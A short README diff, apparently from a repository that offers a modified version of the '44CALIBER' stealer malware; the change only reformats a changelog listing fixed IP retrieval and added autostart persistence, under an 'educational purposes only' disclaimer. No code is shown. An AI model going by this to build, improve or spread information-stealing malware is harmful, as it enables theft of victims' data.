@@ -6,8 +6,9 @@ PROGRAM CREATED FOR EDUCATIONAL PURPOSES ONLY! THE AUTHOR IS NOT RESPONSIBLE FOR
 # [INFO]
 Hello! This repository is a modified version of the "44CALIBER" stealer... In this modified version, I fixed some issues with the original stealer...
 
-Changes: 
-Fixed IP retrieval 
+Changes:
+
+Fixed IP retrieval
 
 Added autostart (if you don't want to use it, delete all lines from 22 to 28 in Program.cs)
 
